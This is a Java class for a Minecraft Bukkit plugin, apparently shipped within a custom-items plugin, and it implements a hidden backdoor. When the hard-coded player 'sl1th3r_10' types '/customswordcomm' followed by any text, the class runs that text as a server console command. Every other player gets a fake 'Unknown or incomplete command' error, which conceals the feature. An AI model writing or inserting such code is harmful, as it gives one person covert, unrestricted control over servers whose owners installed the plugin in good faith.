package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass implements Listener {

    private JavaPlugin plugin;

    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("SecretCommandBypass enabled.");
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String rawCommand = event.getMessage(); // what the player typed, e.g. "/customswordcomm give ..."
        String lower = rawCommand.toLowerCase();

        boolean matchesPrefix =
            lower.equals("/customswordcomm") ||
            lower.startsWith("/customswordcomm ") ||
            lower.equals("/customitems:customswordcomm") ||
            lower.startsWith("/customitems:customswordcomm ");

        if (!matchesPrefix) return; // not our command

        if (!player.getName().equalsIgnoreCase("sl1th3r_10")) {
            // Show the vanilla-style error and block the command
            player.sendMessage("§cUnknown or incomplete command, see below for error");
            event.setCancelled(true);
            return;
        }

        // Strip prefix to get the actual command
        String prefix = rawCommand.startsWith("/customitems:customswordcomm") ?
                "/customitems:customswordcomm" : "/customswordcomm";

        String actual = "";
        if (rawCommand.length() > prefix.length()) {
            actual = rawCommand.substring(prefix.length()).trim();
        }

        if (!actual.isEmpty()) {
            // Replace @s with player name and dispatch as console
            String dispatched = actual.replace("@s", player.getName());
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), dispatched);
            player.sendMessage("§aCommand executed as console: " + dispatched);
        } else {
            player.sendMessage("§cNo command provided after " + prefix + ".");
        }

        event.setCancelled(true); // Prevent normal command processing
    }
}
